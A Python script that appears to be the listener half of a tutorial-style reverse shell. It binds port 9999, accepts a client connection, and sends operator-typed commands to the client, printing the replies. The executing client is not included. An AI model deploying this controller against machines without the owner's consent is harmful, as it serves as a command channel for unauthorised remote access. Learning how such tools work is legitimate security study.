import socket
import sys

#Create A Socket  (Connecting Two Computer)
def create_socket():

    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket Creation Error :"+str(msg))

#Binding the socket and listening for connections

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port : " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding Error :"+str(msg) + "\n" + "Retrying....")
        bind_socket()


# Establish the connection with CLient (socket must be listening)


def socket_accept():
    conn,address = s.accept()
    print("Connection is Established |" + "IP" + address[0] + "| Port" + str(address[1]))
    send_command(conn)
    conn.close()


#Send Command to Client
def send_command(conn):
    while True:
        cmd = input("Enter Command:")
        if cmd == "exit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response=  str(conn.recv(1024),"utf-8")
            print(client_response , end= "")

def main():
    create_socket()
    bind_socket()
    socket_accept()


main()

